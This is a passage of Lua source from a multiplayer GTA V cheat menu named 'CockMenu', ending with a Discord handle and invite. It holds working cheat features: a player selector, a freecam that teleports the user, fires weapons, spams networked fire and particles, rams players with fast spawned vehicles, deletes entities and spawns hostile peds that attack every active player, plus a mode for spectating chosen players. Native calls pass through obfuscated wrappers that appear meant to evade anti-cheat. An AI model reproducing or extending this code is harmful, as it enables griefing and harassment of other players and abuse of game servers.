                           local OnlineMax = 0.7
   
                           if CockT.Global.SelectedPlayer == nil then
                               CockT.Global.SelectedPlayer = ids[1]
                           end
                           for i = 1, #ids do
                               local player = ids[i]
                               local position = ( (0.259*1.0) + (i-1) * 0.02) + CockMeni.Functions.stscr
                               if player == "**Invalid**" then
                               else
                                   if position >= 0.259 and position <= OnlineMax then
                                       if CockMeni.Functions.OnlineButton(0.65, position, false, Fatasf.n.GetPlayerServerId(player), Fatasf.n.GetPlayerName(player)) then 
                                           CockT.Global.SelectedPlayer = player
                                       end         
                                   end      
                               end
                           end
                           
   
                           
                           --[[for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                               local position = ( (0.259*1.0) + (i-1) * 0.02) + CockMeni.Functions.stscr
                               if position >= 0.259 and position <= OnlineMax then
                                   if CockMeni.Functions.OnlineButton(0.65, position, false, Fatasf.n.GetPlayerServerId(player), Fatasf.n.GetPlayerName(player)) then 
                                       CockT.Global.SelectedPlayer= v
                                   end         
                               end     
                           end]]
           
                       end
               end
           end)
   
           CockT.Inv["Thread"](function()
               while CockMenu.MenuEnabled do
                   CockT.Inv["Wait"](0)
                   if Cock.Menu.Freecam then
                       if not shown then
                           local fakeobj = 0
                           local freecam_cam_rot = Fatasf.n.GetCamRot(freecam_cam, 2)
                           freecam_cam = freecam_cam
                           if not freecam_cam ~= nil then
                               freecam_cam = Fatasf.n.CreateCam('DEFAULT_SCRIPTED_Camera', 1)
                           end
                           if not cam ~= nil then
                               cam = Fatasf.n.CreateCam("DEFAULT_SCRIPTED_Camera", 1)
                               freecamcam = cam
                           end
                   
                           Fatasf.n.RenderScriptCams(1, 0, 0, 1, 1)
                           Fatasf.n.SetCamActive(cam, true)
                           
                           local playerX, playerY, playerZ = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()))
                           local xx = CockT.Math.tonumber(CockT.Strings.format("%.2f", playerX))
                           local yy = CockT.Math.tonumber(CockT.Strings.format("%.2f", playerY))
                           local zz = CockT.Math.tonumber(CockT.Strings.format("%.2f", playerZ))
                           
                           Fatasf.n.SetCamCoord(cam, xx, yy-1.0, zz+0.5)
                           local offsetRotX = 0.0
                           local offsetRotY = 0.0
                           local offsetRotZ = 0.0
                           local weapondelay = 0
                   
                           while Fatasf.n.DoesCamExist(freecamcam) do
                               CockT.Inv["Wait"](0)
                               
                   
                               if not Cock.Menu.Freecam then
                                   Fatasf.n.DestroyCam(freecamcam)
                                   Fatasf.n.ClearTimecycleModifier()
                                   Fatasf.n.RenderScriptCams(false, false, 0, 1, 0)
                                   Fatasf.n.SetFocusEntity(Fatasf.n.PlayerPedId())
                                   break
                               end
                               
                               if not shown then
                                   
                                   local playerPed = Fatasf.n.PlayerPedId()
                                   local playerRot = Fatasf.n.GetEntityRotation(playerPed, 2)
                                   
                                   local rotX = playerRot.x
                                   local rotY = playerRot.y
                                   local rotZ = playerRot.z
                                   if not CockT.display_menu then
                                       offsetRotX = offsetRotX - (Fatasf.n.GetDisabledControlNormal(1, 2) * 8.0)
                                       offsetRotZ = offsetRotZ - (Fatasf.n.GetDisabledControlNormal(1, 1) * 8.0)
                                   else
                                       offsetRotX = offsetRotX
                                       offsetRotZ = offsetRotZ
                                   end
                                   if (offsetRotX > 90.0) then
                                       offsetRotX = 90.0
                                   elseif (offsetRotX < -90.0) then
                                       offsetRotX = -90.0
                                   end
                                   if (offsetRotY > 90.0) then
                                       offsetRotY = 90.0
                                   elseif (offsetRotY < -90.0) then
                                       offsetRotY = -90.0
                                   end
                                   if (offsetRotZ > 360.0) then
                                       offsetRotZ = offsetRotZ - 360.0
                                   elseif (offsetRotZ < -360.0) then
                                       offsetRotZ = offsetRotZ + 360.0 
                                   end
                                   local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetCamCoord(cam))
                                   local camCoords       = Fatasf.n.GetCamCoord(cam)			
                                   local v3, forward  = CockMeni.Functions.CamRightVect(cam), CockMeni.Functions.CamFwdVect(cam)
                                   local speedMultiplier = nil	
                                   local currentmode = CockT.Global.FreecamModes[CockT.Global.FreecamMode]
                                   
                   
                                   Fatasf.n.SetTextOutline(); Functions.f.DrawTextTest('.', false, 0.4, 0, 0.5, 0.482)
                                   
                                   
                   
                                   CockT.Inv["Invoke"](CockT.Natives['SetHdArea'], camCoords.x, camCoords.y, camCoords.z, 50.0)			
                                   
                                   Fatasf.n.DisableControlAction(0, 32, true) Fatasf.n.DisableControlAction(0, 31, true) Fatasf.n.DisableControlAction(0, 30, true) Fatasf.n.DisableControlAction(0, 34, true) Fatasf.n.DisableControlAction(0, 22, true) Fatasf.n.DisableControlAction(0, 34, true)  Fatasf.n.DisableControlAction(0, 69, true) Fatasf.n.DisableControlAction(0, 70, true) Fatasf.n.DisableControlAction(0, 92, true) Fatasf.n.DisableControlAction(0, 114, true) Fatasf.n.DisableControlAction(0, 257, true) Fatasf.n.DisableControlAction(0, 263, true) Fatasf.n.DisableControlAction(0, 264, true) Fatasf.n.DisableControlAction(0, 331, true) Fatasf.n.DisableControlAction(0, 24, true) Fatasf.n.DisableControlAction(0, 25, true)
                                   CockT.Inv["Invoke"](CockT.Natives['DisableAllControlActions'], 0)
                                   CockT.Inv["Invoke"](CockT.Natives['DisableAllControlActions'], 1)
                                   if Fatasf.n.IsDisabledControlPressed(0, 21) then					
                                       speedMultiplier = 3.0				
                                   elseif Fatasf.n.IsDisabledControlPressed(0, 36) then					
                                       speedMultiplier = 0.025				
                                   else					
                                       speedMultiplier = 0.25				
                                   end					
                                   if Fatasf.n.IsDisabledControlPressed(0, 32)  then					
                                       local newCamPos = camCoords + forward * speedMultiplier					
                                       Fatasf.n.SetCamCoord(cam, newCamPos.x, newCamPos.y, newCamPos.z)				
                                   end							
                                   if Fatasf.n.IsDisabledControlPressed(0, 33)  then					
                                       local newCamPos = camCoords + forward * -speedMultiplier					
                                       Fatasf.n.SetCamCoord(cam, newCamPos.x, newCamPos.y, newCamPos.z)				
                                   end							
                                   if Fatasf.n.IsDisabledControlPressed(0, 34)  then
                                       local newCamPos = camCoords + v3 * -speedMultiplier					
                                       Fatasf.n.SetCamCoord(cam, newCamPos.x, newCamPos.y, newCamPos.z)				
                                   end							
                                   if Fatasf.n.IsDisabledControlPressed(0, 30)  then					
                                       local newCamPos = camCoords + v3 * speedMultiplier					
                                       Fatasf.n.SetCamCoord(cam, newCamPos.x, newCamPos.y, newCamPos.z)				
                                   end		
                   
                                   if (Fatasf.n.IsDisabledControlPressed(1, 21)) then -- SHIFT
                                       z = z + (0.1 * 2.5)
                                   end
                                   if (Fatasf.n.IsDisabledControlPressed(1, 36)) then -- LEFT CTRL
                                       z = z - (0.1 * 0.5)
                                   end
                                   CockT.Inv["Invoke"](CockT.Natives['SetFocusArea'], Fatasf.n.GetCamCoord(cam).x, Fatasf.n.GetCamCoord(cam).y, Fatasf.n.GetCamCoord(cam).z, 0.0, 0.0, 0.0)
                                   Fatasf.n.SetCamRot(cam, offsetRotX, offsetRotY, offsetRotZ, 2)
                                   local entity = CockT.Global.GetEntityInFrontOfCam()
                                   if entity ~= 0 and Fatasf.n.DoesEntityExist(entity) and GetEntityType(entity) ~= 0 or nil then
                                       CockT.Global.DrawLineBox(entity, 8, 214, 101, 255)
                                   end
                                       
                   
                                   local hit, Markerloc = Fatasf.n.RayCastCam(5000.0) 
                                   
                                   Functions.f.DrawTextTest('~c~[~g~CockMenu~c~] ~s~Freecam mode: ~r~'..currentmode, false, 0.35, 0, 0.5, 0.957)
                   
                                   if Fatasf.n.IsDisabledControlPressed(0, 26) then
                                       local w = true
                                       local fov = 70.0
                                       
                                       CockT.Inv["Thread"](function()
                                           while w do
                                           CockT.Inv["Wait"](0)
                                               fov = fov - 0.1
                                               CockT.Inv["Invoke"](CockT.Natives['SetCamFov'], cam, fov)
                                           end
                                       end)
                                   end
                   
                                   if Fatasf.n.IsDisabledControlPressed(0, 0) then
                                       local w = true
                                       local fov = 70.0
                                       CockT.Inv["Thread"](function()
                                           while w do
                                           CockT.Inv["Wait"](0)
                                               if fov < 70.0 then
                                                   fov = fov + 0.1
                                               end
                                               CockT.Inv["Invoke"](CockT.Natives['SetCamFov'], cam, fov)
                                           end
                                       end)
                                   end
                   
                                   
                   
                                    if Fatasf.n.IsDisabledControlJustPressed(1, CockT.Keys["RIGHT"]) then
                                       CockT.Global.FreecamMode = CockT.Global.FreecamMode + 1
                                       if CockT.Global.FreecamMode > #CockT.Global.FreecamModes then
                                           CockT.Global.FreecamMode = 1
                                       end
                                   end
                   
                                   if Fatasf.n.IsDisabledControlJustPressed(1, CockT.Keys["LEFT"]) then
                                       CockT.Global.FreecamMode = CockT.Global.FreecamMode - 1
                                       if CockT.Global.FreecamMode < 1 then
                                           CockT.Global.FreecamMode = #CockT.Global.FreecamModes
                                       end
                                   end
                   
                                    --Cock.Menu.modes
                                    if currentmode == 'Particle Spam' then
                                       if Fatasf.n.IsDisabledControlPressed(0, 24) and not CockT.display_menu then
                                           local gox_dict = "core"
                                           Fatasf.n.RequestNamedPtfxAsset(gox_dict)					
                                           while not Fatasf.n.HasNamedPtfxAssetLoaded(gox_dict) do
                                               CockT.Inv["Wait"](10)
                                           end
                   
                                           Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("veh_light_amber",Markerloc.x,Markerloc.y,Markerloc.z,0,0,0,10.0,0,0,0)
                                           Fatasf.n.UseParticleFxAsset(gox_dict)
                                           Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("td_blood_shotgun",Markerloc.x,Markerloc.y,Markerloc.z,0,0,0,10.0,0,0,0)
                                           Fatasf.n.UseParticleFxAsset(gox_dict)
                                           Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("veh_respray_smoke",Markerloc.x,Markerloc.y,Markerloc.z,0,0,0,10.0,0,0,0)
                                           
                                           local gox_dict2 = "scr_rcbarry2"
                                           Fatasf.n.RequestNamedPtfxAsset(gox_dict2)					
                                           while not Fatasf.n.HasNamedPtfxAssetLoaded(gox_dict2) do
                                               CockT.Inv["Wait"](10)
                                           end
                   
                                           Fatasf.n.UseParticleFxAsset(gox_dict2)
                                           Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears",Markerloc.x ,Markerloc.y,Markerloc.z,0,0,0,10.0,0,0,0)
                                       end
                                   end
                                   if currentmode == 'Teleport' then
                                       if Fatasf.n.IsDisabledControlPressed(0, 24) and not CockT.display_menu then
                                           Fatasf.n.SetEntityCoords(Fatasf.n.PlayerPedId(), Markerloc.x, Markerloc.y - 0.1, Markerloc.z)
                                       end
                                   end
                                   if currentmode == 'Shooting' then
                                       
                                       local CurrentShootingMode = CockT.Global.ShootingModes[CockT.Global.CurrentShooting]	
                                       local weapon = Fatasf.n.GetHashKey(CurrentShootingMode)
                                       
                                       Functions.f.DrawTextTest('~s~Selected weapon: ~r~'..CurrentShootingMode, false, 0.35, 0, 0.5, 0.94)
                                       if Fatasf.n.IsDisabledControlJustPressed(0, 14) then
                                           CockT.Global.CurrentShooting = CockT.Global.CurrentShooting + 1
                                           if CockT.Global.CurrentShooting > #CockT.Global.ShootingModes then
                                               CockT.Global.CurrentShooting = 1
                                           end
                                       end
                                       if Fatasf.n.IsDisabledControlJustPressed(0, 15) then
                                           CockT.Global.CurrentShooting = CockT.Global.CurrentShooting - 1
                                           if CockT.Global.CurrentShooting < 1 then
                                               CockT.Global.CurrentShooting = #CockT.Global.ShootingModes
                                           end
                                       end
                                       
                                       
                                       if Fatasf.n.IsDisabledControlJustPressed(0, 24) then
                                           CockT.Inv["Invoke"](CockT.Natives['RequestWeaponAsset'], weapon) 
                                           while not Fatasf.n.HasWeaponAssetLoaded(weapon) do
                                               CockT.Inv["Wait"](0)
                                           end
                                           
                                           Fatasf.n.ShootSingleBulletBetweenCoords(Markerloc.x, Markerloc.y, Markerloc.z, Markerloc.x, Markerloc.y, Markerloc.z, 1.0, false, weapon, Fatasf.n.PlayerPedId(), true, false, -1.0)
                                       end
                                   end
                                   if currentmode == 'Prop Spawner ' then
                                       if Fatasf.n.IsDisabledControlJustPressed(0, 25) and not CockT.display_menu then
                                           proptospawn =  Functions.f.CustomInput("Prop to select", "prop_", 20) 
                                       end
                                       
                                       if Fatasf.n.IsDisabledControlJustPressed(0, 24) and not CockT.display_menu then
                                           if proptospawn ~= nil then
                                               local objhash = Fatasf.n.GetHashKey(proptospawn)
                                               Fatasf.n.CreateObject(objhash, Markerloc.x, Markerloc.y, Markerloc.z, true, true, true)
                                           else
                                               local objhash = Fatasf.n.GetHashKey('prop_atm_01')
                                               Fatasf.n.CreateObject(objhash, Markerloc.x, Markerloc.y, Markerloc.z, true, true, true)
                                           end
                                       end
                                   end
                   
                                   if currentmode == "Ram vehicle" then
                                       if Fatasf.n.IsDisabledControlJustPressed(0, 25) and not CockT.display_menu then
                                           vehtospawn =  Functions.f.CustomInput("Vehicle to spawn:", "", 20) 
                                       end
                                       
                                       if Fatasf.n.IsDisabledControlJustPressed(0, 24) then
                                           if vehtospawn ~= nil then
                                               local wa = Fatasf.n.GetHashKey(vehtospawn)
                                               Fatasf.n.RequestModel(wa)
                                               while not Fatasf.n.HasModelLoaded(wa) do
                                                   CockT.Inv["Wait"](0)
                                               end
                                               local veh = Fatasf.n.CreateVehicle(wa, Markerloc.x, Markerloc.y, Markerloc.z, 0.0, true, false)
                                               Fatasf.n.SetVehicleEngineOn(veh, true, true, true)
                                               Fatasf.n.SetEntityRotation(veh, GetCamRot(cam, 2), 0.0, 0.0, 0.0, true)
                                               Fatasf.n.SetVehicleForwardSpeed(veh, 500.0)
                                           else
                                               local var = Fatasf.n.GetHashKey("adder")
                                               Fatasf.n.RequestModel(var)
                                               while not Fatasf.n.HasModelLoaded(var) do
                                                   CockT.Inv["Wait"](0)
                                               end
                                               local veh = Fatasf.n.CreateVehicle(var, Markerloc.x, Markerloc.y, Markerloc.z, 0.0, true, false)
                                               Fatasf.n.SetVehicleEngineOn(veh, true, true, true)
                                               Fatasf.n.SetEntityRotation(veh, GetCamRot(cam, 2), 0.0, 0.0, 0.0, true)
                                               Fatasf.n.SetVehicleForwardSpeed(veh, 500.0)
                                           end
                                       end
                                   end
                                   if currentmode == "Deleter" then
                                       local entity = CockT.Global.GetEntityInFrontOfCam()
                                       
                                       if entity ~= 0 and Fatasf.n.DoesEntityExist(entity) and GetEntityType(entity) ~= 0 or nil then
                                           if Fatasf.n.IsDisabledControlJustPressed(0, 24) then
                                               CockT.Global.DeleteEntity(entity)
                                           end
                                       end
                                   end
                                   if currentmode == "Place fire" then
                                       if Fatasf.n.IsDisabledControlPressed(0, 24) and not CockT.display_menu then
                                           local gox_dict = "core"					
                                           Fatasf.n.RequestNamedPtfxAsset(gox_dict)					
                                           while not Fatasf.n.HasNamedPtfxAssetLoaded(gox_dict) do
                                               CockT.Inv["Wait"](10)				
                                           end
                                           Fatasf.n.UseParticleFxAsset(gox_dict)
                                           Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "ent_sht_petrol_fire", Markerloc.x, Markerloc.y, Markerloc.z, 0, 0, 0, 8.0, 0, 0, 0)
                                       end
                                   end
                                   if currentmode == "Shit spawner" then
                                       local props = {
                                           "prop_tree_olive_cr2", "prop_a4_sheet_03",
                                           "prop_byard_ramp", "prop_abat_roller_static",
                                           "prop_byard_rampold", "prop_afsign_vbike",
                                           "prop_jetski_ramp_01", "prop_aircon_l_02",
                                           "prop_air_chock_04", "prop_battery_01",
                                           "prop_bar_napkindisp", "prop_bar_pump_04",
                                           "prop_billboard_07", "prop_box_ammo07b",
                                       }
                                       if Fatasf.n.IsDisabledControlJustPressed(0, 24) then
                                           local randomprop = props[CockT.Math.random(#props)]
                                           local _a = Fatasf.n.GetHashKey(randomprop)
                                           Fatasf.n.CreateObject(_a, Markerloc.x, Markerloc.y, Markerloc.z, true, true, true)
                                       end
                                   end
                                   if currentmode == "Ped spawner" then
                                       local peds = {
                                           "a_f_m_beach_01", "a_f_m_business_02",
                                           "a_f_m_bevhills_01", "a_f_y_business_04",
                                           "a_f_m_bevhills_02", "a_f_y_fitness_02",
                                           "a_f_m_bodybuild_01", "a_f_y_tourist_01",
                                           "a_m_m_acult_01", "a_m_m_genfat_01",
                                           "a_m_m_hillbilly_01", "a_m_m_paparazzi_01",
                                           "a_m_m_og_boss_01", "a_m_m_soucent_01",
                                       }
                                       if Fatasf.n.IsDisabledControlJustPressed(0, 24) then
                                           local random_ped = peds[CockT.Math.random(#peds)]
                                           local _1 = Fatasf.n.GetHashKey(random_ped)
                                           local _2 = Fatasf.n.GetHashKey(random_ped)
                                           Fatasf.n.RequestModel(_1)
                                           Fatasf.n.RequestModel(_2)
                                           while not Fatasf.n.HasModelLoaded(_1) and not Fatasf.n.HasModelLoaded(_2) do
                                               CockT.Inv["Wait"](1)
                                           end
   
                                           local ped = Fatasf.n.CreatePed(0, _1, Markerloc.x, Markerloc.y, Markerloc.z, 1, true, true)
                                           local ped_2 = Fatasf.n.CreatePed(0, _2, Markerloc.x, Markerloc.y, Markerloc.z, 1, true, true)
                                           
                                           for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                               local player = Fatasf.n.GetPlayerPed(v)
                                               CockT.Inv["Invoke"](CockT.Natives['SetPlayerAngry'], ped, true)
                                               CockT.Inv["Invoke"](CockT.Natives['SetPlayerAngry'], ped_2, true)
                                               CockT.Inv["Invoke"](CockT.Natives['TaskCombatPed'], ped, player, 0, 16)
                                               CockT.Inv["Invoke"](CockT.Natives['TaskCombatPed'], ped_2, player, 0, 16)
                                           end
                                       end
                                   end
                                   
                                   if currentmode == 'Spawner' then
                                       if Fatasf.n.IsDisabledControlJustPressed(0, 25) and not CockT.display_menu then
                                           vehtospawn =  Functions.f.CustomInput("Vehicle to spawn:", "", 20) 
                                       end
                                       
                                       if Fatasf.n.IsDisabledControlJustPressed(0, 24) then
                                           if vehtospawn ~= nil then
                                               local wa = Fatasf.n.GetHashKey(vehtospawn)
                                               Fatasf.n.RequestModel(wa)
                                               while not Fatasf.n.HasModelLoaded(wa) do
                                                   CockT.Inv["Wait"](0)
                                               end
                                               Fatasf.n.CreateVehicle(wa, Markerloc.x, Markerloc.y, Markerloc.z, 0.0, true, false)
                                           else
                                               local var = Fatasf.n.GetHashKey("adder")
                                               Fatasf.n.RequestModel(var)
                                               while not Fatasf.n.HasModelLoaded(var) do
                                                   CockT.Inv["Wait"](0)
                                               end
                                               Fatasf.n.CreateVehicle(var, Markerloc.x, Markerloc.y, Markerloc.z, 0.0, true, false)
                                           end
                                       end
                                   end
                               end       
                           end
                       end
                   end
           
                   if Cock.Menu.Spectate then
                       Fatasf.n.FreezeEntityPosition(Fatasf.n.PlayerPedId(), true)
                               spectate_cam = spectate_cam
                               if not spectate_cam ~= nil then
                           spectate_cam = Fatasf.n.CreateCam("DEFAULT_SCRIPTED_Camera", 1)
                       end
                       Fatasf.n.RenderScriptCams(1, 0, 0, 1, 1)
                       Fatasf.n.SetCamActive(spectate_cam, true)
                       local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer))
                       Fatasf.n.SetCamCoord(spectate_cam, coords.x, coords.y, coords.z + 3)
                       local offsetRotX = 0.0
                       local offsetRotY = 0.0
                       local offsetRotZ = 0.0
           
                       local weapondelay = 0
                       while Fatasf.n.DoesCamExist(spectate_cam) do
                           CockT.Inv["Wait"](0)
                           if not Cock.Menu.Spectate then
                               Fatasf.n.DestroyCam(spectate_cam, false)
                               Fatasf.n.ClearTimecycleModifier()
                               Fatasf.n.RenderScriptCams(false, false, 0, 1, 0)
                               Fatasf.n.FreezeEntityPosition(Fatasf.n.PlayerPedId(), false)
                               Fatasf.n.SetFocusEntity(Fatasf.n.PlayerPedId())
                               break
                           end
                           local playerPed = Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)
                           local playerRot = Fatasf.n.GetEntityRotation(playerPed, 2)
                   
                           local rotX = playerRot.x
                           local rotY = playerRot.y
                           local rotZ = playerRot.z
                           if not CockT.display_menu then
                               offsetRotX = offsetRotX - (Fatasf.n.GetDisabledControlNormal(1, 2) * 8.0)
                               offsetRotZ = offsetRotZ - (Fatasf.n.GetDisabledControlNormal(1, 1) * 8.0)
                           else
                               offsetRotX = offsetRotX
                               offsetRotZ = offsetRotZ
                           end
                   
                           if (offsetRotX > 90.0) then
                               offsetRotX = 90.0
                           elseif (offsetRotX < -90.0) then
                               offsetRotX = -90.0
                           end
                           if (offsetRotY > 90.0) then
                               offsetRotY = 90.0
                           elseif (offsetRotY < -90.0) then
                               offsetRotY = -90.0
                           end
                           if (offsetRotZ > 360.0) then
                               offsetRotZ = offsetRotZ - 360.0
                           elseif (offsetRotZ < -360.0) then
                               offsetRotZ = offsetRotZ + 360.0
                           end
                           local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetCamCoord(spectate_cam))
                           local coords_ES = Fatasf.n.GetEntityCoords(playerPed) + (CockMeni.Functions.RotationToDirection(Fatasf.n.GetCamRot(spectate_cam, 2)) * (0.5 * 1.5))
           
                           Fatasf.n.SetCamCoord(spectate_cam, coords_ES.x, coords_ES.y, coords_ES.z + 4.5)
                           if not Displayed then
                               CockT.Inv["Invoke"](CockT.Natives['SetFocusArea'], Fatasf.n.GetCamCoord(spectate_cam).x, Fatasf.n.GetCamCoord(spectate_cam).y, Fatasf.n.GetCamCoord(spectate_cam).z,0.0,0.0,0.0)
                               Fatasf.n.SetCamRot(spectate_cam, offsetRotX, offsetRotY, offsetRotZ, 2)
                           end
                       end
                   end
           
               end
           end)
           
       end
   
       CockT.Global.pyQp3fKQUcjMbISJDSSy = function()
       end 
   
   end)

-- M1l0SZ#2248
-- https://discord.gg/YE8M7YJqef


